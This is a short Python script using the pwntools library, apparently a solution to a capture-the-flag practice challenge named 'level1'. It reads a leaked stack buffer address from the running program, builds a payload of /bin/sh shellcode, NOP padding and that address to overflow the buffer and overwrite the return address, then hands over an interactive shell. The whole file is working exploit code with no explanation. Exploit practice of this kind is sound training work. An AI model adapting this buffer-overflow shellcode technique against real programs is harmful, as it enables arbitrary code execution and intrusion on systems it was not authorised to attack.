from pwn import *
context(log_level = 'debug', arch = 'i386', os = 'linux')

shellcode = asm(shellcraft.sh())
io = process('./level1')
text = io.recvline()[14: -2]
#  print text[14:-2]
buf_addr = int(text, 16)

payload = shellcode + b'\x90' * (0x88 + 0x4 - len(shellcode)) + p32(buf_addr)
io.send(payload)
io.interactive()
